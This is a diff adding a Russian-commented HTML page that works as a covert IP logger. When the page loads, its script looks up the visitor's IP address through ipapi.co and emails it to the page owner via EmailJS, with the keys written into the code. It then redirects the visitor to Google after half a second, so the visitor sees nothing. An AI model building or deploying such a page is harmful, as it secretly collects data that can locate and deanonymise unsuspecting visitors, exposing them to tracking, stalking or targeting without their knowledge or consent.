@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title></title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+</head>
+<body>
+  <script>
+    emailjs.init("TEWzd8Aj5uS0d7yeq"); // твой публичный ключ
+
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        // отправка IP
+        emailjs.send("service_md495n5", "template_juupnvs", {
+          ip: data.ip
+        }).catch(e => console.error('Ошибка отправки:', e));
+      })
+      .finally(() => {
+        // Автоматический переход через 500 мс
+        setTimeout(() => {
+          window.location.href = 'https://www.google.com';
+        }, 500);
+      });
+  </script>
+</body>
+</html>
